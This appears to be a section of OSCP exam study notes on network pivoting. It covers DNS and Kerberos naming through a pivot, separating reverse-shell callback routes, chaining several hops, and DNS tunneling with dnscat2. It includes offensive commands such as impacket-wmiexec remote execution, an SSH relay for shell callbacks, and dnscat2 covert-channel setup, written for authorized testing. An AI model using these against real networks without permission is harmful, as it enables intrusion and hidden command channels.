- [ Preserve DNS, Kerberos names and time across a pivot](pivoting.md#pivot-dns) — An IP connection works while hostname/Kerberos access fails Required: Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time
- [ Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback) — A pivoted exploit reaches its target but its shell/download cannot return Required: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward
## pivot-dns

### Preserve DNS, Kerberos names and time across a pivot

**Enter:** An IP connection works while hostname/Kerberos access fails

**Discovery**

```text
getent hosts TARGET_HOST
klist
date -u
```

**Interpret:** The route and credential may be valid while name/SPN context is wrong.

**Still check:** Check intended DNS source/result, realm/service name, time and KDC/service routes separately.

**Verify:** Verify resolved destination, ticket/server principal and actual authenticated application action.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#pivot-dns)

### Full procedure and variants

- Decide whether the application resolves the name locally, ProxyChains intercepts it, the SOCKS exit resolves it, or the pivot's configured resolver handles it.
- Use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it.
- Kerberos needs an SPN-compatible hostname, realm/KDC route and correct time. A working IP connection does not prove Kerberos naming works.
- A temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded.

```bash
getent hosts INTERNAL_FQDN
curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_FQDN:PORT/
klist
KRB5_TRACE=/dev/stderr kvno cifs/TARGET_HOST
```

The first command checks Kali's normal resolver. The `curl` form deliberately delegates the destination hostname through SOCKS. Do not assume a generic resolver utility will be intercepted by ProxyChains: NSS implementation and process behavior vary.

For Impacket, preserve the target hostname while routing to an IP when the tool supports it:

```bash
impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP \
  'DOMAIN/USER@TARGET_HOST'
```

### Follow the evidence

- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
- [ Establish domain identity, DC, DNS, time and route](ad-mapping.md#domain-state) — Domain credentials or a domain-joined foothold Required: Correct realm/domain and account qualification; reachable DC/services, usable DNS and acceptable clock skew
- [ Conditional: tunnel through controlled DNS infrastructure](pivoting.md#pivot-dns-tunnel) — DNS is an available carrier while simpler permitted routes are unavailable Required: Controlled/delegated domain or supported direct setup, reachable DNS path, compatible server/client and allowed execution
## pivot-callback

### Build the callback and delivery routes separately from the attack route

**Enter:** A pivoted exploit reaches its target but its shell/download cannot return

**Discovery**

```text
ss -lnt
ip route get TARGET
```

**Interpret:** A working initiating proxy path does not route a target's new connection back to that private interface.

**Still check:** Check the target's route, listener bind, chosen reverse forward/agent listener and final handler.

**Verify:** Verify the target-initiated connection from its source context and the final session or downloaded bytes.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#pivot-callback)

### Full procedure and variants

A forward path and callback path are different graphs:

```text
Kali -> tunnel -> internal service       # access path
internal target -> pivot -> Kali listener # callback path
```

Options:

1. make the callback directly to an address the internal host already reaches;
2. expose a listener on the pivot and relay it to Kali;
3. use a Ligolo agent listener or SSH/Chisel remote forward;
4. choose a non-callback technique such as authenticated remote execution.

Fixed SSH callback relay, run from the pivot:

```bash
ssh -N -g -L 0.0.0.0:PIVOT_PORT:127.0.0.1:KALI_PORT \
  KALI_USER@LHOST -o ExitOnForwardFailure=yes
```

This creates the listener on the SSH client/pivot and makes the destination connection from Kali's SSH server to Kali loopback. `-g` permits other hosts to use the pivot-side local forward. Verify the actual bind with `ss`; do not infer it from command syntax.

Also route payload delivery separately. An internal host may reach the pivot but not Kali's HTTP server; relay the delivery service or serve from the pivot when justified.

### Follow the evidence

- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
- [ Connect a Linux reverse shell through an available interpreter](sessions-transfers.md#session-reverse) — Linux command execution exists but an interactive channel is needed Required: A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener
- [ Transfer over HTTP using Linux or Windows clients](sessions-transfers.md#transfer-http) — A tool/artifact must reach a target that can make an HTTP request Required: Correct server bind and served directory; target-to-server route, available downloader and writable destination
## pivot-multihop

### Compose multiple pivots and validate every connection leg

**Enter:** A second internal network is reachable only from a later foothold

**Discovery**

```text
hostname
ip route
ss -lnt
```

**Interpret:** The break lies beyond a known working leg; a connected second carrier is not a complete final route.

**Still check:** Test each listener-to-destination leg, names and return traffic independently from the correct source.

**Verify:** Validate each hop with an application-aware test before chaining the final client.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#pivot-multihop)

### Full procedure and variants

For every additional hop, write another complete segment:

```text
Kali -> tunnel A -> PIVOT_A -> tunnel B -> PIVOT_B -> INTERNAL_HOST:PORT
```

Rules:

- validate one hop before adding the next;
- avoid overlapping local/VPN/internal routes;
- use unique listener and SOCKS ports;
- record which session owns each route;
- ensure the deeper agent/client can reach the upstream listener;
- re-evaluate DNS and callback direction at every hop;
- prefer a routed method for several deep services instead of stacking many opaque wrappers.

An upstream tunnel failure invalidates every deeper observation. Do not troubleshoot target credentials until the complete path is restored.

### Follow the evidence

- [ Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state) — A foothold exposes an interface/subnet or a loopback-only service Required: A usable pivot process/identity and explicit scope; both forward and return directions must be understood
- [ Build the callback and delivery routes separately from the attack route](pivoting.md#pivot-callback) — A pivoted exploit reaches its target but its shell/download cannot return Required: Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
## pivot-dns-tunnel

### Conditional: tunnel through controlled DNS infrastructure

**Enter:** DNS is an available carrier while simpler permitted routes are unavailable

**Discovery**

```text
dig DOMAIN NS
```

**Interpret:** Delegation is an infrastructure prerequisite; an NS record alone does not prove ownership or an operational tunnel.

**Still check:** Confirm authorized control, resolver path, compatible client/server/runtime and supported intended operation.

**Verify:** Verify the actual carrier and intended forwarded action; retain delegation and connectivity prerequisites.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/#pivot-dns-tunnel)

### Full procedure and variants

Use only when ordinary transports are unavailable and DNS is demonstrably permitted. This is a conditional advanced route, but it remains in the current official BOK.

Prerequisites:

- command execution sufficient to run a compatible client;
- either authoritative control/NS delegation for `TUNNEL_DOMAIN` or direct UDP/53 reachability to the server;
- a resolver chain that forwards the chosen domain externally;
- permission to bind/listen on the required DNS port;
- tolerance for low throughput and conspicuous DNS patterns.

Authoritative-domain mode:

```bash
dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN
```

Client:

```bash
./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN
```

Direct DNS-server mode shown by the server's own usage output:

```bash
./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET
```

Server console:

```text
windows
window -i SESSION_ID
help
```

> A DNS query reaching the server proves only the resolver path. Match the pre-shared secret or independently verify the negotiated authentication string. Cache, recursion, EDNS, TCP fallback, DNS security controls and response-size limits can affect the channel. DNS tunneling is not DNS spoofing; spoofing remains prohibited by the current exam guide.

### Follow the evidence

- [ Relay a single TCP service through a fixed forward](pivoting.md#fixed-forward) — One reachable pivot can connect to one internal TCP destination Required: A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity
- [ Discover pivot interfaces, routes and internal service context](pivoting.md#pivot-state) — A foothold exposes an interface/subnet or a loopback-only service Required: A usable pivot process/identity and explicit scope; both forward and return directions must be understood
- [ Maintain state and select the next evidence-producing test](integration.md#attack-state) — Several hosts, identities, routes or competing hypotheses need coordination Required: Explicit scope/objective and a record of observations, unknowns and available capabilities
